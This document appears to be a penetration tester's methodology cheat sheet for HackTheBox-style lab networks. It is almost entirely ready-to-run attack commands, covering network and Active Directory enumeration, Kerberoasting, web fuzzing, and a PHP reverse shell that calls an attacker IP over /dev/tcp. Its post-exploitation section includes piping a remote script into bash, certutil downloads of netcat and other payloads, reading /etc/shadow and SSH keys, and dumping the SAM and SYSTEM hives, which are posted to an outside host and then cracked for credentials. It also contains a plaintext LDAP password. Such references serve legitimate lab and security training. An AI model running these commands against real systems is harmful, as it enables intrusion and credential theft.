
<h1>My Methodology</h1>
<picture>
  <img src="https://github.com/user-attachments/assets/fb6d2226-5477-4396-be41-e38d2a947be4">
</picture>

<details>
    <summary><H4>Host Discovery (External)</H4></summary>
    
    fping -ag 10.10.110.0/24 2>/dev/null | tee external-ips ; \
    for ip in $(cat external-ips); do nmap=$(nmap -p- --max-retries 1 --min-rate 10000 --open "$ip" | grep -vE 'Warning:|filtered|latency|Starting'); echo "$nmap"; ports=$(echo "$nmap" | sed -n 's|/.*||p' | paste -sd ','); echo "nmap -sC -sV -Pn -p$ports $ip"; echo; done
</details>

<details>
    <summary><H4>Host Discovery (Internal)</H4></summary>
    
    fping -ag 172.16.1.0/24 2>/dev/null | tee internal-ips ; \
    for ip in $(cat internal-ips); do nmap=$(nmap -p- --max-retries 1 --min-rate 10000 --open "$ip" | grep -vE 'Warning:|filtered|latency|Starting'); echo "$nmap"; ports=$(echo "$nmap" | sed -n 's|/.*||p' | paste -sd ','); echo "nmap -sC -sV -Pn -p$ports $ip"; echo; done
</details>

<details>
    <summary><H4>Service Enumeration</H4></summary>

  <h5>Nmap Scripts</h5>

    nmap -Pn -sC -sV 172.16.1.10 -p22,80,139,445
<h5>LDAP</h5>

    ldap=$(nmap --script "ldap* and not brute" -p 389 172.16.1.10); echo "$ldap"
    ldapsearch -H ldap://dc01.xxxxxx.xxx/ -D "xxxxxx\P.Rosa" -w 'Rosaisbest123' -b "" -s base "(objectClass=*)" | grep -v 'supported'
    ldapsearch -H ldap://dc01.xxxxxx.xxx/ -D "xxxxxx\P.Rosa" -w 'Rosaisbest123' -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" "*" | grep 'SAM' -B 4 -A 3
<h5>Kerberos</h5>    

    impacket-getST -spn dc01 vintage.htb/'USERNAME':'PASSWORD'

    nano /etc/krb5.conf
    [libdefaults]
    default_realm = VINTAGE.HTB
    dns_lookup_kdc = true
    dns_lookup_realm = false
    [realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
    }
    [domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB

    export KRB5CCNAME='/home/me/USERNAME@dc01@VINTAGE.HTB.ccache'
    kinit -c '/home/me/USERNAME@dc01@VINTAGE.HTB.ccache' 'USERNAME@VINTAGE.HTB'
    klist

    impacket-GetADUsers -dc-host dc01.vintage.htb -k vintage.htb/
    impacket-GetNPUsers -usersfile usernames domain/ -dc-ip 172.16.1.10
    impacket-GetUserSPNs -request-user "$objuser" -dc-ip 172.16.1.10 domain/username:password
    impacket-GetUserSPNs -no-preauth "$user" -usersfile usernames -dc-host 172.16.1.10 domain/
    impacket-GetUserSPNs -request -dc-ip 172.16.1.10 domain/username:password
   <h5>FTP</h5>

    nxc ftp 172.16.1.10 --port 21 -u 'anonymous' -p 'anonymous' --ls
    ftp 172.16.1.10
    anonymous
    anonymous
    ls -a
    binary
    ascii
   <h5>SMB</h5>
  
    nxc smb 172.16.1.10 --port 445 -u usernames -p passwords --rid-brute 10000
    nxc smb 172.16.1.10 --port 445 -u usernames -p passwords --shares
    impacket-smbclient domain/'user':'password'@172.16.1.10
    shares
    use
   <h5>MySQL</h5>

    mysql -h 172.16.1.10 -u root@localhost -e 'show databases;'

   <h5>NFS Mounts</h5>
   
    for x in $(showmount -e 172.16.1.10 | awk '{print $1}' | grep -v 'Export')
        do mkdir -p "/dev/shm"/mnt"$x"
        sudo mount -t nfs 172.16.1.10:"$x" "/dev/shm"/mnt"$x" -o nolock
        tree -puga "/dev/shm"/mnt"$x"
    done
</details>

<details>
    <summary><H4>Web Enumeration</H4></summary>

   <h5>Technology Discovery</h5>
   
    whatweb http://10.10.110.100

   <h5>WAF Discovery</h5>
   
    wafw00f http://10.10.110.100
    
   <h5>WordPress Discovery</h5>
   
    wpscan --url http://10.10.110.100/wordpress --enumerate
    
   <h5>Directory Discovery</h5>

    ffuf -u 'http://10.10.110.100/FUZZ' -t 400 -rate 10000 -e .php -v -recursion -mc 200,301 \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
    2>/dev/null | grep -oP '(http.*)(?<!/)$'
    
<h5>Directory Traversal</h5>

    ffuf -u 'http://10.10.110.100/nav.php?page=FUZZ' -t 400 -rate 10000 -v -mc 200 \
    -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
    2>/dev/null | grep -oP '(http.*)(?<!/)$'
    
   <h5>XSS + SSTI</h5>
   
    <img src=x>'"${{7*7}}
    
   <h5>Subdomain Discovery</h5>
   
    gobuster vhost --append-domain -u example.com -k -r -t200 -q \
    -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
    | grep -oP '(?<=Found: )[^ ]+'
</details>

<details>
    <summary><H4>Exploitation</H4></summary>
  
<h5>Reverse Shell Listeners</h5>

    nc -lvnp 4444
    msfconsole -q -x "use multi/handler; set LHOST 10.10.17.97; set LPORT 4444; run"

<h5>Reverse Shells</h5>

    <?php
        $lhost = "10.10.16.3";
        $lport = 4444;
        
        exec("bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'");
        $sock = fsockopen($lhost, $lport);
        if ($sock) {
            exec("sh <&3 >&3 2>&3");
            }
    ?>
    
  <h5>Upgrade TTY</h5>
  
    python3 -c 'import pty; pty.spawn("/bin/bash")';
    CTRL-Z
    stty size;stty raw -echo;fg
    export SHELL=bash;
    export TERM=xterm-256color;
    stty rows <num> columns <num>
    reset
</details>

<details>
    <summary><H4>Post Exploitation</H4></summary>
    
   <h5>Linux</h5>
   
    ssh user@xxxxxxxxx -i id_rsa -L 33060:localhost:33060
    netstat -tuln
    ls -la /opt
    sudo -l
    find / -perm /4000 2>/dev/null
    grep -r -E 'conf' /var/www
    cat ~/.ssh/id_rsa
    cat /etc/shadow
    curl xxxxxxxxxx:8088/linpeas.sh | bash
    GTFO bins
    
   <h5>Windows</h5>
   
    evil-winrm -i xxxxxxxxxx -u 'username' -p 'password'
    evil-winrm -i xxxxxxxxxx -u 'username' -H 'hash'
    cd C:\users
    tree /f
    powershell -c "certutil -urlcache -f http://xxxxxxxxxx:8088/winpeas.exe C:\programdata\winpeas.exe"
    powershell -c "certutil -urlcache -f http://xxxxxxxxxx:8088/nc.exe C:\programdata\nc.exe"
    
    click.url
    [InternetShortcut]
    URL=C:\programdata\shell.bat
    
    meterpreter > use priv
    meterpreter > getsystem
    
    nxc winrm xxxxxxxxxx -u 'username' -p 'password' -x \
    '
    powershell -c rm *.SAV
    powershell -c reg save HKLM\SYSTEM SYSTEM.SAV
    powershell -c reg save HKLM\SAM SAM.SAV
    powershell -c compress-archive *.SAV SAM.zip
    powershell -c dir
    iwr http://xxxxxxxxxx:xxxx -Method POST -InFile SAM.zip
    '; unzip -o SAM.zip; \
    impacket-secretsdump LOCAL -sam SAM.SAV -system SYSTEM.SAV
    
    powershell -c "certutil -urlcache -f http://xxxxxxxxxx:8088/powerview.ps1 C:\programdata\powerview.ps1"
    powershell Import-Module C:\programdata\powerview.ps1
    Get-NetDomain
    Get-LocalUser
    Set-DomainObject -Identity USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
    bloodhound-python -c all -u 'username' -p 'password' -d "$domain" -dc "$dc" -ns "$target"
    bloodhound-python -c default -u 'username' -p 'password' -d "$domain" -dc "$dc" -ns "$target"
</details>
